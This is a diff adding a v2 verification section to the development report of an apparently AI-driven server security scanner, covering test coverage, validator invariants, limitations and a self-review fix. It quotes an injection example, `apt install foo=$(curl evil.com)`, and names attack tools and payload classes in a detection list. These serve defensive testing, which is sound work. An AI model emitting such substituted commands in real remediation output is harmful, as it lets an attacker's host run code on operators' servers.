@@ -467,3 +467,103 @@ out-of-threat-model with a clear rationale.
 - No live CONFIRMED case yet — every scored verdict so far is `MITIGATED_BY_CONFIG`. v2 test cases should include genuinely-vulnerable installed versions.
 
 Formal dual-engine cross-review (Claude + Gemini via a working `agy` or via `gemini` CLI) remains a nice-to-have follow-up but is not blocking this deliverable.
+
+---
+
+## 11. v2 verification pass (2026-10-01, chunk v2-14)
+
+Mirrors §1-§10 above for the four modules added in v2: `network-prober`,
+`attack-simulator`, `fix-publisher`, plus the extended `exposure-analyzer`
+(dynamic probes + HITL + network_state).
+
+**Headline:** v2 Spec success gate MET on real-lab data. 20/24 (83%) v1-mode
+baseline → 23/24 (95.8%) v2-mode, with 3 fixes and 0 regressions on the
+widened ground truth. See `eval-lab/reports/eval_summary.md` for the full
+numbers table + per-detection-source breakdown.
+
+### 11.1 Test counts + coverage per package
+
+Measured via `coverage.py` on 2026-10-01. Target floor from v1 chunk V was ≥85%; all v2 modules exceed it.
+
+| Package | Tests | Coverage |
+|---|---:|---:|
+| `exposure-analyzer` | 146 | 88% |
+| `attack-simulator` | 67 | 91% |
+| `fix-publisher` | 84 | 91% |
+| `network-prober` | 35 | 90% |
+| **Total** | **332** | **90% avg** |
+
+Uncovered lines are predominantly `__main__.py` entry wrappers (4 lines each, trivial), CLI error paths, and the deferred SDK import paths in `build_claude_*_fn` (marked `# pragma: no cover` — exercised only in live Claude runs).
+
+### 11.2 Correctness invariants verified in v2
+
+In addition to v1's six invariants (which remain green), v2 adds:
+
+- **Structured argv is a hard security floor for dynamic probes.** The `parse_proposal` validator (v2-7) refuses shell wrappers (sh/bash/dash/...), binaries containing shell metachars, args containing `;|><&\n\r\t`, and over-length rationales/args. 24 adversarial unit tests in `tests/test_proposal.py`.
+
+- **HITL gate decision precedence is deterministic.** Order: skip-all latch > empty-binary sentinel > `--auto-approve-all-unsafe` > `--auto-approve-known` (hash-match) > interactive HITL > non-TTY default-DENY. 22 unit tests in `tests/test_hitl.py` + live smoke in §11.5.
+
+- **Learned-probe identity collisions are impossible by construction.** `argv_hash()` uses `sha256(binary + NUL + NUL.join(args))`. The validator forbids NUL in binary or args, so `["foo", "bar"]` and `["foobar"]` cannot collide.
+
+- **fix-publisher commands reject all command-substitution routes.** The v2-14 audit added `_FORBIDDEN_METACHARS` covering `$()`, backticks, `|`, `>`, `<` on top of the existing shell-chain operators (`&&`, `;`, `||`, newline), so an operator pasting `apt install foo=$(curl evil.com)` into bash cannot trigger command injection even if the model emitted it. 5 new test cases.
+
+- **Attack-narrative output cannot smuggle attacker-tool invocations.** SYSTEM_PROMPT states 4 HARD PROHIBITIONS; `scan_for_tool_invocations` does a post-generation regex sweep across 12 pattern classes (`nmap`, `sqlmap`, `metasploit`, `curl -X POST`, EDB-IDs, JNDI payloads, etc.). Live-run observations: zero violations across 7 narratives produced on real Claude Sonnet.
+
+- **HTML section injection is idempotent + XSS-safe.** v2-11 extended `append_verdicts_to_report` with marker-based re-inject for 3 section types. Running the pipeline 3 times leaves exactly 1 of each section in the HTML, with every model-produced field `html.escape`'d. Verified with `test_reinjection_replaces_sibling_sections` + XSS-escape tests.
+
+### 11.3 Deployability — fresh-server install path
+
+`scripts/bootstrap-linux.sh` was extended in v2-14 to pip-install the three new sibling packages (`network-prober`, `attack-simulator`, `fix-publisher`) alongside the v1 three, and now closes with a `nmap` presence check (required by network-prober).
+
+**v2 operational dependencies on top of v1's:**
+- `nmap` (apt-installable)
+- `python-nmap`, `jsonschema` (pip; both in network-prober/requirements.txt)
+- Docker + Compose when running the eval-lab path (`eval-attacker` container runs the prober)
+
+For a defense-friendly single-command demo: `docker compose up` from `eval-lab/` brings everything up including the `eval-attacker` coordinator.
+
+### 11.4 Known limitations (v2 scope)
+
+- **apt-only remediation.** `fix-publisher` emits Debian/Ubuntu apt commands; RPM/DNF/YUM explicitly out of scope (deferred to v3). The validator rejects commands naming other package managers.
+- **Prompt-adapter fidelity on attack narratives.** PentestGPT-inspired three-stage shape (Recon/Discovery/Exploitation) is adapted, not vendored. Live tool-execution + feedback loop is NOT in v2.
+- **Sampling noise on borderline library CVEs.** One case in the v2-5b stability rerun (web-vuln CVE-2022-0778 on patched 1.1.1n) flipped to CONFIRMED on one of two runs. Methodology mitigation (multi-run averaging, temperature=0) deferred as a v3 concern.
+- **Non-eval-lab targets unvalidated.** All numbers in `eval_summary.md` come from the three controlled Dockerfiles. Real-world servers may surface new failure modes.
+
+### 11.5 Module demo checklist from the v2 Spec
+
+All four scenarios pass as of 2026-10-01 (v2-14 live smoke closed the one unit-tested-only item from v2-13):
+
+| # | Scenario | Status | Evidence |
+|---|---|---|---|
+| 1 | network-prober banners on eval-db-exposed port 6379 | ✅ | `eval-lab/prober-output/eval-db-exposed.net.json` |
+| 2 | dynamic probe LLM proposal + HITL approval + execution + learned_probes.jsonl append | ✅ (v2-14 live smoke) | 3 LLM-proposed probes approved via `--auto-approve-all-unsafe` ran via docker exec, appended to local `learned_probes.jsonl` with argv_hash + rationale + expected_signals |
+| 3 | attack-simulator on CVE-2022-0543 Redis → three-section narrative, zero tool invocations | ✅ | `eval-lab/reports/eval-db-exposed/attack_narratives.md` |
+| 4 | fix-publisher CVE-2022-0778 on cms-plugin → `apt install libssl1.1=<pinned>` | ✅ | `eval-lab/reports/eval-cms-plugin/remediations.md` |
+
+### 11.6 v2-14 adversarial self-review findings
+
+Mirrors v1 chunk V's Phase 2b. One substantive finding:
+
+**Finding A (confirmed, fixed).** The `fix-publisher` validator caught shell-chain operators (`&&`, `;`, `||`, newline) but did NOT catch command-substitution routes (`$()`, backticks) or redirections (`|`, `>`, `<`). An operator pasting `apt install foo=$(curl evil.com)` into their shell would have executed the subshell. Fix: added `_FORBIDDEN_METACHARS` with the five remaining shell-injection vectors and threaded it through both `_validate_apt_command` and `_validate_service_restart`. 5 new test cases. Caught before any live operator could paste a bad command — the SYSTEM_PROMPT already told the model not to emit them, and the live-smoke runs happened to not produce one.
+
+No other findings survived verification. The HTML sections' XSS surface (`html.escape` on every model field), the structured-argv probe boundary (hard refusal of shell wrappers), and the sys.path shim in report.py (scoped to this repo's siblings only) all held under scrutiny.
+
+### 11.7 Reproducibility from a clean checkout — v2 full chain
+
+```
+git clone <repo> && cd AI-security-agent
+./scripts/bootstrap-linux.sh --with-eval-lab
+cd eval-lab && docker compose up -d --build && cd ..
+./eval-lab/run_full_scan.sh eval-db-exposed --engine=claude --v2
+# → produces full HTML report under eval-lab/reports/eval-db-exposed/report.html
+```
+
+### 11.8 Test count + coverage summary (final, post-v2-14)
+
+- **332 tests** across 4 packages, all green.
+- **90% average coverage** across the pipeline code.
+- All v2 Spec success criteria met.
+- 1 adversarial self-review finding, fixed inline.
+- No deferred blockers for v2 ship.
+
+Ready to merge `v2-dev → main` and tag `v2.0`.
